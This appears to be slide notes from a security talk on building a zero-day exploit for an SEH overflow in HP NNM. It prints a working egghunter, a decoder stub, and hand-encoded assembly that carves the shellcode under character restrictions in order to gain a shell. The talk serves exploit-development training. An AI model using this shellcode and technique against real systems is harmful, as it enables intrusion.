### From BUG to 0day – Busting the Perimeter

**Speaker: Mati Aharoni, Offensive Security**

#### Overview
- **0wnage via 0day**: Achieving control through zero-day exploits is highly advanced.
- **Real-World Exploit Development Challenges**: An in-depth look at the complexities involved.
- **Live Session Overview**: A detailed walkthrough of the HP NNM exploit development cycle.
- **Personal Experience**: The process was so challenging that it needed to be shared.
- **Tools and Techniques**: Extensive use of OllyDbg for debugging and analysis.

#### Key Steps in Exploit Development
1. **Identify the Bug**: Locate the vulnerability in the target software.
2. **Determine the Type of Vulnerability**: In this case, it was a Structured Exception Handling (SEH) vulnerability.
3. **Character Restrictions**: Identify the allowed characters for the initial payload.
4. **Alternative Short Jump**: Find a way to bypass the RET address using an alternate short jump.
5. **Buffer/Memory Placement**: Determine a suitable location in the buffer or memory for the second, final payload.
6. **Egghunter as First Payload**: Use an egghunter to locate the second payload.
7. **Manual Encoding of Shellcode**: Encode the shellcode to bypass character restrictions.

#### The Journey Begins
**Manual Encoding of the First Stage Shellcode (Egghunter)**
1. **Allowed Instruction Sets**: Identify the instructions that can be used.
2. **Align EAX with Stack Location**: Ensure EAX points to the stack location where the shellcode will be decoded.
3. **Encode the Egghunter**: Use AND, SUB, and ADD instructions to encode the egghunter.
4. **Decode and Push the Egghunter**: Decode the egghunter and push it onto the stack.
5. **Run the Egghunter**: Execute the egghunter to find the second payload.
6. **Execute the Final Payload**: Trigger the second and final payload to gain a shell.

#### Limited Character Set
The allowed characters are:
```
\x01\x02\x03\x04\x05\x06\x07\x08\x09\x31\x32\x33\x34\x35\x36\x37
\x38\x39\x3b\x3c\x3d\x3e\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a
\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a
\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a
\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a
\x7b\x7c\x7d\x7e\x7f
```
Due to these restrictions, a short jump using `\xeX` is not possible, necessitating manual encoding of the payload.

#### Example of Manually Encoded Payload
```assembly
\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x49\x49\x49\x49\x49\x49
\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x37\x51\x5a\x6a\x41
\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42
\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49
```

#### Writing Self-Decoding Payloads
Example of a self-decoding payload:
```assembly
\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74
\xef\xb8\x54\x30\x30\x57\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7
```

**Steps to Align the Stack and Carve Out the Egghunter Payload**
1. **Zero Out EAX**:
   ```assembly
   25 4A4D4E55    AND EAX,554E4D4A # Zero out EAX
   25 3532312A    AND EAX,2A313235 # Zero out EAX
   ```
2. **Align EAX to End of Buffer**:
   ```assembly
   54             PUSH ESP         # Put address of ESP in EAX
   58             POP EAX
   2D 664D5555    SUB EAX,55554D66 # Align EAX to end of buffer
   2D 664B5555    SUB EAX,55554B66 # This is where the egghunter
   2D 6A505555    SUB EAX,5555506A # will be decoded
   50             PUSH EAX      # push the offset address to stack
   5C             POP ESP       # align ESP to this address
   ```
3. **Carve Out the Last 4 Bytes**:
   ```assembly
   25 4A4D4E55  AND EAX,554E4D4A  # zero out EAX
   25 3532312A  AND EAX,2A313235  # zero out EAX
   2D 21555555  SUB EAX,55555521  # carve out last 4 bytes (1)
   2D 21545555  SUB EAX,55555421  # carve out last 4 bytes (2)
   2D 496F556D  SUB EAX,6D556F49  # carve out last 4 bytes (3)
   50           PUSH EAX          # push E7FFE775 on to the stack
   ```

#### Manually Encoded Shellcode
- **Egghunter**:
  ```assembly
  \x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74
  \xef\xb8\x54\x30\x30\x57\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7
  ```

- **Final Payload**: 
  - The final payload is executed after the egghunter locates it.

#### Live Demo
- **From BUG to 0day – Busting the Perimeter**

#### Conclusion
- **Thank You!**
- **Questions?**

For more information, visit [Offensive Security](http://www.offensive-security.com).